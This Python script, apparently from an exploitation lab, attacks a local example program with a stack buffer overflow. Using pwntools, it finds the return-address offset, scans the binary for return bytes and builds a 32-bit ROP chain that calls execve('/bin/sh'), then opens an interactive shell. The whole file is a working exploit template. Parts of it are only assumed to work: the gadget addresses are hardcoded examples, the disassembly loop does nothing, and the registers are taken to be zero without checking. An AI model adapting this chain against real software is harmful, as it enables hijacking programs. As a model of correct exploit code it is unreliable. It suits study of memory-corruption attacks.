import os
import sys
import struct
import subprocess
from pwn import *
from capstone import *

from pwn import context
context.terminal = ['sh', '-c']

def find_offset(binary_path):
    pattern = cyclic(200)

    p = process(binary_path)
    p.sendline(pattern)
    p.wait_for_close()

    # Analyze the core dump
    core = p.corefile
    eip_value = core.eip

    offset = cyclic_find(eip_value)
    log.info(f"Offset found at {offset} bytes")
    return offset

def find_gadgets(binary_path):
    with open(binary_path, 'rb') as f:
        binary_data = f.read()

    # Initialize Capstone disassembler for 32-bit x86 (only 32-bit instructions for now)
    md = Cs(CS_ARCH_X86, CS_MODE_32)

    # Find all 'ret' instructions
    gadgets = []
    for i in range(len(binary_data)):
        # Look for 'ret' opcode 0xC3
        if binary_data[i] == 0xC3:
            # Extract bytes before 'ret' to form gadgets
            for length in range(1, 6):  # Gadget lengths from 1 to 5 bytes
                start = max(0, i - length)
                bytes_chunk = binary_data[start:i+1]
                for insn in md.disasm(bytes_chunk, 0x1000 + start):
                    # Disassembly step (can be expanded)
                    pass
                gadgets.append(bytes_chunk)
    log.info(f"Found {len(gadgets)} gadgets")
    return gadgets

def construct_payload(offset, gadgets, elf):
    # Example: Build a payload to call system("/bin/sh")

    # Find necessary gadgets manually or from the gadgets list
    # For simplicity, we'll assume we have the following gadgets:
    # - 'pop eax; ret'
    # - 'pop ebx; ret'
    # - 'int 0x80; ret'

    # Manually specify gadget addresses (example values)
    pop_eax = 0x080b84aa  # Address of 'pop eax; ret'
    pop_ebx = 0x080481c9  # Address of 'pop ebx; ret'
    int_80 = 0x08049421   # Address of 'int 0x80; ret'

    # Addresses might differ; use your gadget finder to get accurate addresses

    # System call numbers
    SYS_execve = 11

    # Construct the payload
    payload = b'A' * offset  # Padding to reach return address

    # Set eax to SYS_execve (11)
    payload += p32(pop_eax)
    payload += p32(SYS_execve)

    # Set ebx to address of '/bin/sh'
    bin_sh = next(elf.search(b'/bin/sh'))
    payload += p32(pop_ebx)
    payload += p32(bin_sh)

    # Set ecx and edx to 0 (NULL)
    # You would need gadgets to set ecx and edx to 0
    # For simplicity, we'll assume they are already zeroed

    # Invoke 'int 0x80' to make the system call
    payload += p32(int_80)

    log.info("Payload constructed")
    return payload

def deploy_exploit(binary_path, payload):
    # Use pwntools to run the process and send the payload
    p = process(binary_path)
    p.sendline(payload)
    p.interactive()


def main():
    binary_path = '../examples//bin/vuln_program_1'
    elf = ELF(binary_path)

    offset = find_offset(binary_path)

    gadgets = find_gadgets(binary_path)

    payload = construct_payload(offset, gadgets, elf)

    deploy_exploit(binary_path, payload)

if __name__ == '__main__':
    main()
